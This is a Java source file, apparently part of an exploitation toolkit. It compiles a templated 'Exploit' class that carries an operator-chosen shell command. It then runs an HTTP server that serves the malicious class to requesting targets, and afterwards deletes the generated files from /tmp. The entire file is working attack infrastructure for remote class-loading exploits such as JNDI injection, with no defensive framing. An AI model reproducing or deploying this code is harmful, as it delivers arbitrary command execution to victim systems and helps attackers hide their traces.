import com.sun.net.httpserver.HttpContext;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import payloads.TemplateExploit;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Paths;

public class BasicHttpServer implements Runnable{
    private String ip = "127.0.0.1";
    private int port = 8889;
    private String cmd = "";
    private static String evilClass = "Exploit.class";

    public BasicHttpServer(String ip, Integer port, String cmd){
        this.ip = ip;
        this.port = port;
        this.cmd = cmd;
    }

    public static void main(String[] args) throws Exception {
       if(args.length == 0)
        {
            System.out.println("You need to indicate <IP> <PORT> <COMMAND>");
            System.exit(0);
        }

        BasicHttpServer bs = new BasicHttpServer(args[1],Integer.parseInt(args[2]),args[3]);
        bs.start();
    }
    public void start() {
        // Compile the Evil Class
        Compiler compiler = new Compiler();
        if (!compiler.run(new TemplateExploit(this.cmd).getContent().toString())){
            System.out.println("- Something is wrong with the Exploit.java - Exiting");
            return;
        }
        try {
            HttpServer server = HttpServer.create(new InetSocketAddress(this.ip,this.port), 0);
            HttpContext context = server.createContext("/");
            context.setHandler(BasicHttpServer::handleEvilRequest);
            System.out.println("- HTTP server started at "+ip+":"+port+" -");
            server.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
        removeFiles();
    }

    private static void handleEvilRequest(HttpExchange exchange) throws IOException {
        byte[] bytes = null;
        try {
            bytes = Files.readAllBytes(Paths.get("/tmp/"+BasicHttpServer.evilClass));
        }catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("- Receiving request from target, sending "+BasicHttpServer.evilClass+ " -");
        exchange.sendResponseHeaders(200, bytes.length);//response code and length
        OutputStream os = exchange.getResponseBody();
        os.write(bytes);
        os.close();
    }

    private void removeFiles(){
        File fileExploitSource = new File("/tmp/Exploit.java");
        File fileExploitClass  = new File("/tmp/"+BasicHttpServer.evilClass);

        if (fileExploitSource.exists()) fileExploitSource.deleteOnExit();
        if (fileExploitClass.exists() && (fileExploitClass.getParentFile().exists() && fileExploitClass.getParentFile().isDirectory())) {
            File parent = fileExploitClass.getParentFile();
            fileExploitClass.deleteOnExit();
            parent.deleteOnExit();
        }

    }
    @Override
    public void run() {
        this.start();
    }
}